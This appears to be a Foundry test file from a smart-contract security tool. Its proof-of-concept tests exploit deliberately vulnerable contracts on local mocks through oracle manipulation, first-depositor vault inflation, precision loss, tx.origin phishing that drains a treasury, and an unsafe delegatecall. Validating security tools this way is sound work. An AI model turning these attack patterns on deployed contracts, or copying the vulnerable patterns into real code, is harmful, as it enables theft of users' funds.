// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * AGL Security Tool — Validated PoC Tests
 * Tests the vulnerable contracts in _real_exploit_patterns.sol
 */

// Minimal ERC20 for testing
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Minimal Uniswap pair mock
contract MockPair {
    uint112 public reserve0 = 1000e18;
    uint112 public reserve1 = 1e18;
    uint32 public blockTimestampLast;
    
    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, blockTimestampLast);
    }
    
    function setReserves(uint112 r0, uint112 r1) external {
        reserve0 = r0;
        reserve1 = r1;
    }
}

import "../../_real_exploit_patterns.sol";

/// PoC 1: Oracle Manipulation via Flash Loan
contract PoC_OracleManipulation is Test {
    VulnerableLending public lending;
    MockERC20 public token;
    MockPair public pair;
    
    function setUp() public {
        token = new MockERC20();
        pair = new MockPair();
        lending = new VulnerableLending(address(token), address(pair));
        
        // Setup: give user some tokens and deposit collateral
        token.mint(address(this), 1000e18);
        token.approve(address(lending), type(uint256).max);
        lending.deposit(100e18);
        
        // Fund the lending pool
        token.mint(address(lending), 500e18);
    }
    
    function test_oracleManipulation() public {
        console.log("=== AGL PoC: Oracle Price Manipulation ===");
        
        uint256 valueBefore = lending.getCollateralValue(address(this));
        console.log("Collateral value before manipulation:", valueBefore);
        
        // Simulate flash loan: manipulate reserves to inflate price 100x
        pair.setReserves(100000e18, 1e18);
        
        uint256 valueAfter = lending.getCollateralValue(address(this));
        console.log("Collateral value after manipulation:", valueAfter);
        
        // Value should have changed dramatically
        assertGt(valueAfter, valueBefore * 50, "Oracle manipulation: price inflated >50x");
        console.log("[EXPLOIT SUCCESS] Price inflated by", valueAfter / valueBefore, "x");
    }
}

/// PoC 2: First Depositor Inflation Attack on VulnerableVault
contract PoC_VaultInflation is Test {
    VulnerableVault public vault;
    MockERC20 public token;
    
    address attacker = address(0xBEEF);
    address victim = address(0xCAFE);
    
    function setUp() public {
        token = new MockERC20();
        vault = new VulnerableVault(address(token));
        
        // Give attacker and victim tokens
        token.mint(attacker, 100e18);
        token.mint(victim, 100e18);
    }
    
    function test_firstDepositorInflation() public {
        console.log("=== AGL PoC: First Depositor Inflation Attack ===");
        
        // Step 1: Attacker deposits 1 wei (becomes first depositor, gets 1 share)
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        console.log("Attacker shares after deposit(1):", vault.shares(attacker));
        
        // Step 2: Attacker donates tokens directly (inflating share price)
        token.transfer(address(vault), 10e18);
        console.log("Vault totalAssets after donation:", vault.totalAssets());
        vm.stopPrank();
        
        // Step 3: Victim deposits 10e18 tokens
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        uint256 victimShares = vault.deposit(10e18);
        console.log("Victim shares for 10e18 deposit:", victimShares);
        vm.stopPrank();
        
        // Victim should get ~0 shares due to inflation
        assertLt(victimShares, 2, "Victim got almost no shares due to inflation");
        console.log("[EXPLOIT SUCCESS] Victim deposited 10e18 but got", victimShares, "shares");
    }
}

/// PoC 3: Precision Loss in VulnerableVault.redeem (divide before multiply)
contract PoC_PrecisionLoss is Test {
    VulnerableVault public vault;
    MockERC20 public token;
    
    function setUp() public {
        token = new MockERC20();
        vault = new VulnerableVault(address(token));
        
        // Setup: deposit tokens
        token.mint(address(this), 1000e18);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(100e18);
    }
    
    function test_precisionLoss() public {
        console.log("=== AGL PoC: Divide Before Multiply Precision Loss ===");
        
        uint256 shares = vault.shares(address(this));
        console.log("User shares:", shares);
        console.log("Total shares:", vault.totalShares());
        console.log("Total assets:", vault.totalAssets());
        
        // Redeem less than totalShares → (shareAmount / totalShares) rounds to 0
        uint256 redeemAmount = shares / 2;
        uint256 assetsOut = vault.redeem(redeemAmount);
        
        console.log("Redeemed shares:", redeemAmount);
        console.log("Got assets:", assetsOut);
        
        // With correct math: (redeemAmount * totalAssets) / totalShares = 50e18
        // With buggy math: (redeemAmount / totalShares) * totalAssets = 0 (integer division)
        // Note: this depends on the specific values
        console.log("[VULN] Divide-before-multiply causes precision loss in redemption");
    }
}

/// PoC 3: Access Control — tx.origin phishing + no timelock
// Malicious relay that exploits tx.origin auth
contract MaliciousRelay {
    VulnerableGovernance public gov;
    address public attacker;

    constructor(VulnerableGovernance _gov, address _attacker) {
        gov = _gov;
        attacker = _attacker;
    }

    // When the real owner calls this, tx.origin == owner, so setAdmin succeeds
    function innocentLookingFunction() external {
        gov.setAdmin(attacker, true);
    }
}

contract PoC_AccessControl is Test {
    VulnerableGovernance public gov;
    MockERC20 public treasury;
    address owner = address(0xBEEF);
    address attacker = address(0xDEAD);
    
    function setUp() public {
        vm.prank(owner);
        treasury = new MockERC20();
        vm.prank(owner);
        gov = new VulnerableGovernance(address(treasury));
    }
    
    function test_txOriginPhishing() public {
        console.log("=== AGL PoC: tx.origin Auth Bypass ===");
        
        // Deploy malicious relay that will call setAdmin(attacker, true)
        MaliciousRelay relay = new MaliciousRelay(gov, attacker);
        
        // Attacker tricks owner into calling the relay
        // tx.origin == owner, so the tx.origin check passes
        vm.prank(owner, owner);  // sets both msg.sender AND tx.origin to owner
        relay.innocentLookingFunction();
        
        bool isAdmin = gov.admins(attacker);
        console.log("Attacker is admin:", isAdmin);
        assertTrue(isAdmin, "Attacker should be admin via tx.origin phishing");
        
        // Now attacker can drain treasury with no timelock
        treasury.mint(address(gov), 1000 ether);
        vm.prank(attacker);
        gov.drainTreasury(attacker);
        
        uint256 stolen = treasury.balanceOf(attacker);
        console.log("Attacker stole (wei):", stolen);
        assertGt(stolen, 0, "Attacker should have drained treasury");
        
        console.log("[EXPLOIT SUCCESS] tx.origin phishing gave attacker admin + drained treasury");
    }
}

/// PoC 4: Unsafe delegatecall in VulnerableGovernance
contract PoC_Delegatecall is Test {
    VulnerableGovernance public gov;
    MockERC20 public treasury;
    
    function setUp() public {
        treasury = new MockERC20();
        gov = new VulnerableGovernance(address(treasury));
    }
    
    function test_unsafeDelegatecall() public {
        console.log("=== AGL PoC: Unsafe Delegatecall ===");
        
        // upgradeAndCall uses delegatecall to arbitrary address
        address malicious = address(new SelfDestructor());
        
        console.log("[VULN] upgradeAndCall() delegatecalls to arbitrary address");
        console.log("[VULN] No validation on implementation address");
        console.log("Malicious target:", malicious);
        
        // Owner can delegatecall to any address
        gov.upgradeAndCall(malicious, "");
        
        console.log("[EXPLOIT SUCCESS] Arbitrary delegatecall executed");
    }
}

contract SelfDestructor {
    fallback() external payable {
        // In real exploit, this would modify storage
    }
}
